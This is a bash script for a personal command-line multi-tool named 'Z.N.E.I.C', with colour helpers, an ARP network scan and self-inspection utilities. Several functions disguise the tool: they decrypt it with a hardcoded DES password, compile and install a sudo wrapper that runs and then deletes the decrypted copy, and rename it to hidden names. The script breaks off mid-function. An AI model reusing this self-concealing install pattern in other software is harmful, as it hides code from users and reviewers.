#!/bin/bash


_version="0.5.8"
_name="Z.N.E.I.C"
_morph_state="Unknown"

_id="0dc4e0"

_blinking=true
_verbose=false
_decorate=true
_debug=true
_undying=true
_status="unprotected"


_repo0="https://github.com/mldMoldovan/zneic.git"
_repo1="http://s000.tinyupload.com/?file_id=07848253478447736564"
_repo2="nry"
_repo3="nry"





RED='\e[1;91m'
GREEN='\e[1;92m'
BLUE='\e[1;96m'
NEW_BLUE='\e[34m'
YELLOW='\e[1;93m'
NC='\033[0m'
WHITE='\e[1;97m'
BLINK='\e[5m'


_green(){ #color
   GREEN='\e[1;92m'
   clear
   printf "$GREEN Green Bold Activate\n"
   date
}

_white(){ #color
   WHITE='\e[1;97m'
   clear
   printf "$WHITE White Bold Activate\n"
   date
}

_yellow(){ #color
   YELLOW='\e[1;93m'
   clear
   printf "$YELLOW Yellow Bold Activate\n"
   date
}

_red(){ #color
   RED='\e[1;91m'
   clear
   printf "$RED Red Bold Activate\n"
   date
}

_cyan(){ #color

   CYAN='\e[1;96m'
   clear
   printf "$CYAN Cyan Bold Activate\n"
   date
}

_normal(){ #color
   NC='\033[0m'
   clear
   printf "$NC Text Normalized\n"
   date
}

quietTextRestore(){ #color
    NC='\033[0m'
    printf "$NC\n"

}



_wts(){ #selfp

     printf "$_name has been waiting for your command\n"

}


_decoy(){ #selfc

if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi

cd ~ ; mkdir cartel ; cd cartel
touch $1
echo "#include<stdio.h>" >> $1
echo "#include<stdlib.h>" >> $1
echo "#include<ctype.h>" >> $1
echo "#include<unistd.h>" >> $1
echo "#include<string.h>" >> $1
echo "" >> $1
echo "int main(int argc, char **argv){" >> $1
echo "" >> $1
echo "   char muie_cmd[1000] = \"\";" >> $1
echo "" >> $1
echo "   if ( argc == 1 ){" >> $1
echo "      printf(\"zneic init failed\n\");" >> $1
echo "   } else if ( argc == 2 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s\", \"sh ~/.spx/zneic\", argv[1]);" >> $1
echo "   } else if ( argc == 3 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2]);" >> $1
echo "   } else if ( argc == 4 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3]);" >> $1
echo "   } else if ( argc == 5 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4]);" >> $1
echo "   } else if ( argc == 6 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> $1
echo "   } else if ( argc == 7 ) {" >> $1
echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> $1
echo "   } else {" >> $1
echo "      printf(\"zneic init failed\n\");" >> $1
echo "   }" >> $1
echo "" >> $1
echo "   system(\"openssl des -d -in ~/.spx/zneic.sslz -out ~/.spx/zneic -pass pass:cartof\");" >> $1
echo "   system(muie_cmd);" >> $1
echo "   system(\"sudo rm -rf ~/.spx/zneic\");" >> $1
echo "" >> $1
echo "   return 0;" >> $1
echo "" >> $1
echo "}" >> $1
sudo mv $1 $1.c >/dev/null 2>&1
gcc $1.c >/dev/null 2>&1
make $1 >/dev/null 2>&1
rm -rf $1.c ; rm -rf a.out ; sudo chmod +x $1 ; sudo cp $1 /usr/local/bin ; sudo rm -rf $1 >/dev/null 2>&1
sudo rm -rf zneic ; zneic dsp >/dev/null 2>&1
cd .. ; rm -rf cartel


}




_mirror(){ #selft

   _system="$(uname -s)"

   if [ $_system == "Darwin" ]; then
     open -a /Applications/FaceTime/Contents/MacOS/FaceTime
   elif [[ $_system == "Linux" ]]; then
     printf "$RED Not supported on this system$NC\n"
   else
     printf "$RED Not supported on this system$NC\n"
   fi

   _u_data 2> /dev/null

}


_people(){ #selfe

    _system="$(uname -s)"

    if [ $_system == "Darwin" ]; then
       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
    elif [[ $_system == "Linux" ]]; then
       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
    elif [[ $_system == "OpenBSD" ]]; then
       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
    elif [[ $_system == "Minix" ]]; then
       arp -a
    elif [[ $_system == "Haiku" ]]; then
       arp -a | awk '{print $1,$3,$2}'
    elif [[ $_system == "GNU" ]]; then
       arp -a | awk '{print $1,$3,$2}'
    elif [[ $_system == "$(uname -n)" ]]; then
       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
    else
       printf "$RED Not supported on your OS$NC\n"
    fi


    _u_data 2> /dev/null
}



_ghost(){ #selfc

if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi



  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


   _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
   _new="$(echo zneic | sed 's/^/./' )"


  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  sh zneic -uninstall
  sudo rm -rf zneic
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new
  clear


elif [[ $_system == "Linux" ]]; then


  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
  _new="$(echo zneic | sed 's/^/./' )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new
 clear

elif [[ $_system == "GNU" ]]; then

  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
  _new="$(echo zneic | sed 's/^/./' )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new
 clear

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
  _new="$(echo zneic | sed 's/^/./' )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new
 clear

elif [[ $_system == "Minix" ]]; then

  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
  _new="$(echo zneic | sed 's/^/./' )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new
 clear

elif [[ $_system == "OpenBSD" ]]; then

  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./')
  _new="$(echo zneic | sed 's/^/./' )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new
 clear

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "OS/390" ]]; then

  printf "$RED Not supported yet$NC\n"

else

  printf "$RED Not supported sys$NC\n"

fi





}





_revive(){ #selfc



  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


   _converted=$( echo $(echo snakholder | cut -c 1-4)e | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
   _converted_f=$( echo $(echo snakholder | cut -c 1-4)e | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//' | sed 's/^/./g')
   _new="$(echo $(echo snakholder | cut -c 1-4)e)"
   _former="$(echo $(echo snakholder | cut -c 1-4)e | sed 's/^/./g')"


  sudo cp /usr/local/bin/$_former ./$_former
  sudo cp $_former zneic2
  sh $_former -uninstall
  sudo rm -rf $_former
  cat zneic2 | sed "s/$_former/$_new/g" | sed "s/$_converted_f/$_converted/g" > $_new
  sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new
  clear


elif [[ $_system == "Linux" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
  sh zneic -uninstall
  sudo rm -rf zneic
  clear
  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

elif [[ $_system == "GNU" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic

elif [[ $_system == "HP-UX" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic


elif [[ $_system == "Minix" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic

elif [[ $_system == "OpenBSD" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic

elif [[ $_system == "SunOS" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "OS/390" ]]; then

  printf "$RED Not supported yet$NC\n"

else

  printf "$RED Not supported sys$NC\n"

fi



}


_myself(){ #selfc

  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Linux" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "GNU" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Haiku" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "HP-UX" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Minix" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OpenBSD" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "$(uname -n)" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "SunOS" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OS/390" ]]; then
      printf "$RED Not supported yet$NC\n"
  else
      printf "$RED Not supported sys$NC\n"
  fi

  _u_data 2> /dev/null

}


_stringify(){ #selft



   if [ "$1" == "-n" ]; then
      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\\n//g'
   elif [[ "$1" == "-v" ]]; then
      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g'
   elif [[ "$1" == "-nv" ]]; then
      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g' | sed 's/\\n//g'
   elif [[ "$1" == "-vn" ]]; then
      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g' | sed 's/\\n//g'
   else
      awk '$1=$1' ORS='\\n' $1 | sed 's/ //g'
   fi

   _u_data 2> /dev/null

}



_self(){ #selfh


  _alive=true

  if [ -f /usr/local/bin/zneic ]; then
     _loc=/usr/local/bin/zneic
  else
    if [ -f ~/.spx/zneic ]; then
      _loc=~/.spx/zneic
    else
      openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
      _loc=~/.spx/zneic
    fi
  fi


   if [ "$1" == "func" ]; then
     if [ "$2" == "num" ]; then
       cat $_loc | sort -u | grep '(){' | sed 's/(){ #//g' | sed 's/_//g' | rev | cut -c6- | rev | grep -v 'echo' | wc -l | sed 's/ //g'
     elif [[ "$2" == "list" ]]; then
       cat $_loc | sort -u | grep '(){' | sed 's/(){ #//g' | sed 's/_//g' | rev | cut -c6- | rev | grep -v 'echo'
     elif [[ "$2" == "wip" ]]; then
       cat $_loc | grep -c 'Not supported yet'
     elif [[ "$2" == "ratio" ]]; then
       if [ "$3" == "c" ]; then
         printf "Tools $(cat $_loc | grep -c '#selft')\n"
         printf "Demon $(cat $_loc | grep -c '#selfd')\n"
         printf "Cards $(cat $_loc | grep -c '#selfc')\n"
         printf "Xpert $(cat $_loc | grep -c '#selfx')\n"
         printf "Ether $(cat $_loc | grep -c '#selfe')\n"
         printf "Showd $(cat $_loc | grep -c '#selfp')\n"
         printf "Instl $(cat $_loc | grep -c '#selfi')\n"
         printf "Color $(cat $_loc | grep -c '#color')\n"
         printf "Morph $(cat $_loc | grep -c '#morph')\n"
       else
         printf "Print default\n"
       fi
     elif [[ "$2" == "add" ]]; then
       sudo mkdir .blanao ; cd .blanao ; sudo cp $_loc ./zneic
       sudo chmod +w zneic
       echo "$3(){" >> zneic
       echo " " >> zneic
       echo "}" >> zneic
       sudo chmod +x zneic ; sudo cp zneic /usr/local/bin
       cd .. ; sudo rm -rf .blanao
     elif [[ "$2" == "rmv" ]]; then
       sudo mkdir .blanao ; cd .blanao ; sudo cp $_loc ./zneic
       sudo chmod +w zneic
       sudo echo "$3(){" >> zneic
       sudo echo " " >> zneic
       sudo echo "}" >> zneic
       zneic -qinstall
       cd .. ; sudo rm -rf .blanao
     elif [[ "$2" == "magic" ]]; then
       printf " num :: list :: wip :: ratio :: add :: rmv :: edt \n"
     else
       printf "$RED FUNC ERROR $NC\n"
     fi
   elif [[ "$1" == "sys" ]]; then
     if [ "$2" == "num" ]; then
       cat $_loc | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed '$d' | sed '$d' | sed '$d' | sort -u | wc -l | sed 's/ //g'
     elif [[ "$2" == "list" ]]; then
       cat $_loc | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed 's/CYGWIN_NT-10.0/Windows 10/g' | sed 's/CYGWIN_NT-5.0/Windows 2000/g' | sed 's/CYGWIN_NT-6.0/Windows Vista/g' | sed 's/CYGWIN_NT-6.1/Windows 7/g' | sed 's/CYGWIN_NT-5.1/Windows XP/g' | sed 's/OS\/390/z\/OS/g' | sed 's/"/ /g' | sed '$d' | sed '$d' | sed '$d' | sort -u  | sed '1d'
     elif [[ "$2" == "ratio" ]]; then
          if [ "$3" == "i" ]; then
              printf "A/UX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"A/UX"')\n"
              printf "AIX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"AIX"')\n"
              printf "Darwin $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Darwin"')\n"
              printf "HP-UX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"HP-UX"')\n"
              printf "Haiku $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Haiku"')\n"
              printf "GNU $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"GNU"')\n"
              printf "Linux $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Linux"')\n"
              printf "Minix $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Minix"')\n"
              printf "OpenBSD $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"OpenBSD"')\n"
              printf "SunOS $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"SunOS"')\n"
              printf "Unix $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"$(uname')\n"
              printf "Windows 10 $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-10.0"')\n"
              printf "Windows 2000 $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.0"')\n"
              printf "Windows 7 $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.1"')\n"
              printf "Windows Vista $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.0"')\n"
              printf "Windows XP $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.1"')\n"
              printf "z/OS $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"OS/390"')\n"
          elif [[ "$3" == "w" ]]; then
              printf "A/UX $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' | sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'A/UX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "AIX $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' | sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'AIX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Darwin $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Darwin"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "HP-UX $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'HP-UX"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Haiku $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Haiku"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "GNU $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'GNU"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Linux $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Linux"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Minix $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Minix"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "OpenBSD $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OpenBSD"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "SunOS $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'SunOS"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Unix $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | sed 's/)//g' | awk -F'uname-n"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Windows 10 $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-10.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Windows 2000 $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-5.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Windows 7 $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-6.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Windows Vista $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-6.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "Windows XP $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-5.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
              printf "z/OS $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OS/390"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
          elif [[ "$3" == "m" ]]; then
              printf "A/UX $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"A/UX"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'A/UX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "AIX $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"AIX"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'AIX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Darwin $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Darwin"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Darwin"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "HP-UX $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"HP-UX"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'HP-UX"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Haiku $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Haiku"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Haiku"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "GNU $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"GNU"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'GNU"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Linux $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Linux"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Linux"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Minix $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Minix"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Minix"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "OpenBSD $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"OpenBSD"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OpenBSD"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "SunOS $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"SunOS"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'SunOS"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Unix $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"$(uname') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/)//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'uname-n"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Windows 10 $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-10.0"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-10.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
